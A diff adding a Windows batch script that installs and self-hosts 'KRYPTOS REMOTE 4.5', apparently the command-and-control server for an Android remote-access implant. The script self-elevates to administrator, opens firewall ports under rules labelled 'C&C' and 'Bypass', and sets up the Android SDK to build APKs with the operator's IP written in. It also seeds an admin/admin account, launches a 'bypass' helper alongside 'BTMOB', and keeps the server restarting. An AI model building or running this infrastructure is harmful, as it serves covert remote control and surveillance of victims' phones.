@@ -1,0 +1,253 @@
+@echo off
+chcp 65001 >nul
+setlocal EnableDelayedExpansion
+title KRYPTOS REMOTE 4.5 - Instalador + Servidor
+
+:: ================= AUTO-ELEVACION A ADMINISTRADOR =================
+net session >nul 2>&1
+if %errorLevel% NEQ 0 (
+    echo Pidiendo permisos de administrador...
+    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
+    exit /b
+)
+
+echo =======================================================================
+echo        INSTALADOR + AUTO-HOSPEDAGEM - KRYPTOS REMOTE v4.5
+echo =======================================================================
+echo.
+
+set "ANDROID_HOME=%LOCALAPPDATA%\Android\Sdk"
+set "CMDTOOLS=%ANDROID_HOME%\cmdline-tools\latest\bin"
+set "USE_VENV=0"
+
+REM ============ 0. Requisitos ============
+echo [0/10] Comprobando requisitos...
+where py >nul 2>&1
+if errorlevel 1 (
+    where python >nul 2>&1
+    if errorlevel 1 (
+        echo [ERRO] Python no encontrado. Abriendo descarga...
+        start https://www.python.org/downloads/
+        echo        Instala Python 3.12 marcando "Add Python to PATH" y reejecutame.
+        pause & exit /b 1
+    )
+    set "PY=python"
+) else (
+    set "PY=py"
+)
+echo       Python OK
+
+REM ============ 1. Localizar pasta do servidor ============
+echo [1/10] Localizando el servidor...
+set "SCRIPT_DIR=%~dp0"
+if "%SCRIPT_DIR:~-1%"=="\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"
+set "SERVER_DIR="
+
+if exist "%SCRIPT_DIR%\server\main.py" set "SERVER_DIR=%SCRIPT_DIR%\server"
+if not defined SERVER_DIR if exist "%SCRIPT_DIR%\main.py" set "SERVER_DIR=%SCRIPT_DIR%"
+if not defined SERVER_DIR (
+    for /f "delims=" %%i in ('dir /s /b "%SCRIPT_DIR%\main.py" 2^>nul') do (
+        if not defined SERVER_DIR set "SERVER_DIR=%%~dpi"
+    )
+)
+if not defined SERVER_DIR (
+    echo [ERRO] No encontre la carpeta del servidor [con main.py].
+    pause & exit /b 1
+)
+if "%SERVER_DIR:~-1%"=="\" set "SERVER_DIR=%SERVER_DIR:~0,-1%"
+echo       Servidor: %SERVER_DIR%
+cd /d "%SERVER_DIR%" || exit /b 1
+
+REM ============ 2. Firewall ============
+echo [2/10] Abriendo puertos en el Firewall...
+netsh advfirewall firewall add rule name="KRYPTOS C&C 7771" dir=in action=allow protocol=TCP localport=7771 >nul 2>&1
+netsh advfirewall firewall add rule name="KRYPTOS Bypass 8080" dir=in action=allow protocol=TCP localport=8080 >nul 2>&1
+echo       Puertos 7771 y 8080 listos
+
+REM ============ 3. JDK (necesario para compilar APKs) ============
+echo [3/10] Comprobando Java (JDK)...
+set "JAVA_OK=0"
+where java >nul 2>&1
+if not errorlevel 1 set "JAVA_OK=1"
+if exist "C:\Program Files\Eclipse Adoptium" (
+    for /d %%J in ("C:\Program Files\Eclipse Adoptium\*") do set "JAVA_HOME=%%J"
+)
+if defined JAVA_HOME if exist "!JAVA_HOME!\bin\java.exe" set "JAVA_OK=1"
+
+if "!JAVA_OK!"=="1" goto :java_listo
+
+echo       Instalando JDK 17 (una sola vez)...
+where winget >nul 2>&1
+if errorlevel 1 goto :jdk_manual
+winget install --id EclipseAdoptium.Temurin.17.JDK -e --silent --accept-source-agreements --accept-package-agreements
+goto :java_buscar
+
+:jdk_manual
+echo       [AVISO] winget no disponible, bajando JDK portable...
+curl -L -o "%TEMP%\jdk17.zip" "https://api.adoptium.net/v3/binary/latest/17/ga/windows/x64/jdk/hotspot/normal/eclipse"
+powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; Expand-Archive -Path '%TEMP%\jdk17.zip' -DestinationPath '%TEMP%\jdk17' -Force"
+for /d %%J in ("%TEMP%\jdk17\*") do set "JAVA_HOME=%%J"
+
+:java_buscar
+if exist "C:\Program Files\Eclipse Adoptium" (
+    for /d %%J in ("C:\Program Files\Eclipse Adoptium\*") do set "JAVA_HOME=%%J"
+)
+
+:java_listo
+if defined JAVA_HOME (
+    set "PATH=!JAVA_HOME!\bin;!PATH!"
+    setx JAVA_HOME "!JAVA_HOME!" >nul 2>&1
+    echo       JAVA_HOME: !JAVA_HOME!
+) else (
+    where java >nul 2>&1
+    if errorlevel 1 (echo       [AVISO] JDK no detectado. El panel anda, pero el build de APK puede fallar.) else (echo       Java OK)
+)
+
+REM ============ 4. Android SDK ============
+echo [4/10] Comprobando Android SDK...
+if not exist "%CMDTOOLS%\sdkmanager.bat" (
+    echo       Instalando command-line tools...
+    curl -L -o "%TEMP%\cmdtools.zip" "https://dl.google.com/android/repository/commandlinetools-win-11076708_latest.zip"
+    powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; Expand-Archive -Path '%TEMP%\cmdtools.zip' -DestinationPath '%TEMP%\cmdtools' -Force"
+    if not exist "%ANDROID_HOME%\cmdline-tools" mkdir "%ANDROID_HOME%\cmdline-tools"
+    xcopy /E /I /Y "%TEMP%\cmdtools\cmdline-tools" "%ANDROID_HOME%\cmdline-tools\latest" >nul
+)
+set "PATH=%PATH%;%ANDROID_HOME%\platform-tools;%CMDTOOLS%;%ANDROID_HOME%\emulator"
+setx ANDROID_HOME "%ANDROID_HOME%" >nul 2>&1
+
+if exist "%CMDTOOLS%\sdkmanager.bat" (
+    if exist "%TEMP%\yes.txt" del /F /Q "%TEMP%\yes.txt" >nul 2>&1
+    for /L %%i in (1,1,30) do echo y>> "%TEMP%\yes.txt"
+    call "%CMDTOOLS%\sdkmanager.bat" --sdk_root="%ANDROID_HOME%" --licenses < "%TEMP%\yes.txt" >nul 2>&1
+    call "%CMDTOOLS%\sdkmanager.bat" --sdk_root="%ANDROID_HOME%" "platform-tools" "platforms;android-34" "build-tools;34.0.0" >nul 2>&1
+    echo       SDK OK
+) else (
+    echo       [AVISO] sdkmanager no disponible, salto el SDK.
+)
+
+REM ============ 5. Liberar portas ============
+echo [5/10] Liberando puerto 7771 (8080 queda libre para BTMOB)...
+powershell -Command "Get-NetTCPConnection -LocalPort 7771 -ErrorAction SilentlyContinue | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force -ErrorAction SilentlyContinue }" >nul 2>&1
+
+REM ============ 6. venv ============
+echo [6/10] Configurando entorno Python...
+if exist "venv\Scripts\python.exe" (
+    echo       Recreando venv...
+    rmdir /s /q venv
+)
+%PY% -m venv venv
+if errorlevel 1 (
+    echo [AVISO] Fallo el venv. Uso Python global.
+    set "USE_VENV=0"
+) else (
+    set "USE_VENV=1"
+    call venv\Scripts\activate.bat
+)
+
+echo       Instalando dependencias...
+python -m pip install --upgrade pip >nul 2>&1
+pip install -r requirements.txt
+if errorlevel 1 (echo [AVISO] Algunas dependencias fallaron, sigo...)
+
+REM ============ 7. Variables de entorno ============
+set PYTHONIOENCODING=utf-8
+set DATABASE_URL=sqlite:///gangstar_local.db
+set KRYPTOS_HOST=0.0.0.0
+set KRYPTOS_PORT=7771
+set KRYPTOS_UVICORN_WORKERS=1
+
+REM ==== IP que se graba en el APK: 0 = IP local (casa) | 1 = IP publica (VPS) ====
+set "USAR_IP_PUBLICA=0"
+set "IP_FORZADA="
+
+REM ============ 8. Detectar IP publica ============
+echo [7/10] Detectando IP...
+set "DETECTED_IP="
+for /f "delims=" %%i in ('curl -4 -s --max-time 6 https://api.ipify.org') do set "DETECTED_IP=%%i"
+echo(!DETECTED_IP!|findstr /r /c:"^[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*$" >nul 2>&1
+if errorlevel 1 set "DETECTED_IP="
+
+set "CURRENT_ENV_IP="
+if exist ".env" (
+    for /f "usebackq tokens=2 delims==" %%a in (`findstr /b "SERVER_URL=" .env`) do (
+        set "TEMP_URL=%%a"
+        set "TEMP_URL=!TEMP_URL:http://=!"
+        set "TEMP_URL=!TEMP_URL:https://=!"
+        for /f "tokens=1 delims=:" %%b in ("!TEMP_URL!") do set "CURRENT_ENV_IP=%%b"
+    )
+)
+
+set "LAN_IP="
+for /f "usebackq delims=" %%i in (`powershell -NoProfile -Command "Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -match '^(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.)' } | Select-Object -First 1 -ExpandProperty IPAddress"`) do set "LAN_IP=%%i"
+
+set "LOCAL_IP="
+if "!USAR_IP_PUBLICA!"=="1" (
+    if defined DETECTED_IP (set "LOCAL_IP=!DETECTED_IP!") else (set "LOCAL_IP=!LAN_IP!")
+    echo       [OK] Modo VPS - IP publica: !LOCAL_IP!
+) else (
+    if defined IP_FORZADA (set "LOCAL_IP=!IP_FORZADA!") else (set "LOCAL_IP=!LAN_IP!")
+    if not defined LOCAL_IP (set "LOCAL_IP=!DETECTED_IP!")
+    if not defined LOCAL_IP (set "LOCAL_IP=127.0.0.1")
+    echo       [OK] Modo casa - IP local: !LOCAL_IP!   publica: !DETECTED_IP!
+)
+
+set "SHOULD_WRITE=0"
+if not exist ".env" (set "SHOULD_WRITE=1") else if "!LOCAL_IP!" NEQ "!CURRENT_ENV_IP!" (set "SHOULD_WRITE=1")
+if "!SHOULD_WRITE!"=="1" (
+    (
+        echo SERVER_URL=http://!LOCAL_IP!:7771
+        echo SERVER_WS_URL=ws://!LOCAL_IP!:7771/ws
+        echo KRYPTOS_HOST=0.0.0.0
+        echo KRYPTOS_PORT=7771
+        echo DATABASE_URL=sqlite:///gangstar_local.db
+    ) > .env
+    echo       [OK] .env escrito con IP: !LOCAL_IP!
+) else (
+    echo       [OK] .env conservado: !LOCAL_IP!
+)
+
+REM Sincronizar el .env de la raiz
+if exist "..\server\gangstar_env.py" copy /y ".env" "..\.env" >nul 2>&1
+
+REM ============ 9. BD + admin ============
+echo [8/10] Inicializando BD y admin...
+if exist "init_database.py" python init_database.py
+if exist "seed_local_admin.py" python seed_local_admin.py
+if errorlevel 1 (echo [AVISO] Fallo el seed. Continuo...)
+
+REM ============ 10. Bypass 8080 ============
+echo [9/10] Bypass 8080...
+netstat -ano | findstr /c:":8080" | findstr /i /c:"LISTENING" >nul 2>&1
+if not errorlevel 1 (
+    echo       [INFO] Puerto 8080 ocupado por BTMOB - no lanzo bypass.
+    goto :bypass_listo
+)
+if exist "projeto_bypass\launch_8080.py" (
+    if "!USE_VENV!"=="1" (
+        start "KRYPTOS Bypass (8080)" cmd /k ""%SERVER_DIR%\venv\Scripts\python.exe" "%SERVER_DIR%\projeto_bypass\launch_8080.py""
+    ) else (
+        start "KRYPTOS Bypass (8080)" cmd /k "python "%SERVER_DIR%\projeto_bypass\launch_8080.py""
+    )
+) else (
+    echo       [AVISO] projeto_bypass no encontrado, salto el 8080.
+)
+:bypass_listo
+
+echo.
+echo =======================================================================
+echo   SERVIDOR RODANDO
+echo     Local:  http://localhost:7771
+echo     Rede:   http://!LOCAL_IP!:7771
+echo     Usuario: admin   Senha: admin
+echo.
+echo   IMPORTANTE: abri el puerto 7771 TCP en el panel del proveedor.
+echo =======================================================================
+echo.
+
+:loop
+echo [10/10] Arrancando servidor principal...
+python main.py
+echo.
+echo [INFO] El servidor paro. Reiniciando en 5 segundos...
+timeout /t 5 /nobreak >nul
+goto loop
